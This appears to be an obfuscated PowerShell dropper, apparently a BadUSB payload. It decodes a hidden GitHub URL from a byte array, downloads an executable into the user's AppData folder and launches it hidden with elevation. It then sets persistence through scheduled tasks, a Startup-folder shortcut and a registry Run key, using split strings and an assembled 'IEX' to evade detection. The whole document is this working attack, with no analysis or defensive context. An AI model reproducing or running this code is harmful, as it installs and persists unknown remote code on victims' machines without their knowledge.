Set-Alias z1 Invoke-WebRequest
Set-Alias z2 Start-Process

# Build commands using character math
$Dg = [Text.Encoding]::ASCII
$U1 = $Dg::GetString(([byte[]](104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,116,104,101,45,115,104,97,100,111,119,45,119,97,108,107,101,114,47,98,97,100,45,117,115,98,45,102,108,105,112,112,101,114,45,112,97,121,108,111,97,100,115,47,109,97,105,110,47,69,88,69,47,87,105,110,85,109,97,110,46,101,120,101)))
$X9 = "$env:APPDATA" + "\" + ('W'+'i'+'n'+'U'+'m'+'a'+'n') + '.exe'

# Download executable
$C1 = { &z1 -Uri $U1 -OutFile $X9 -UseBasicParsing }
$L1 = "I" + "E" + "X"
&($L1) ($C1.ToString())

# Execute hidden with elevation
$Z2 = 'S'+'t'+'a'+'r'+'t'+'-'+'P'+'r'+'o'+'c'+'e'+'s'+'s'
&($Z2) -FilePath $X9 -Verb ('R'+'u'+'n'+'A'+'s') -WindowStyle Hidden

# Task scheduler persistence
$a = &("N"+"ew-S"+"cheduledTaskAction") -Execute $X9
$t = &("N"+"ew-S"+"cheduledTaskTrigger") -AtLogOn
$s = &("N"+"ew-S"+"cheduledTaskSettingsSet") -StartWhenAvailable -AllowStartIfOnBatteries
$pr = &("N"+"ew-S"+"cheduledTaskPrincipal") -UserId $env:USERNAME -RunLevel Highest
$task = &("New-S"+"cheduledTask") -Action $a -Trigger $t -Settings $s -Principal $pr
&("Register-S"+"cheduledTask") -TaskName "WU" -InputObject $task -Force

# schtasks unlock fallback
$escaped = $X9 -replace '\\','\\\\'
&("schtasks") /Create /F /TN "WinUmanUnlock" /TR "$escaped" /SC ONUNLOCK /RL HIGHEST /RU "$env:USERNAME" >$null

# Startup folder shortcut
$ObjC = 'N'+'ew'+'-Obj'+'ect'
$shell = &($ObjC) -ComObject WScript.Shell
$sPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUman.lnk"
$sc = $shell.CreateShortcut($sPath)
$sc.TargetPath = $X9
$sc.WorkingDirectory = (Split-Path $X9)
$sc.WindowStyle = 7
$sc.Description = "WU Shortcut"
$sc.Save()

# Registry fallback
$regSet = 'Set'+'-'+'Item'+'Property'
&($regSet) -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $X9
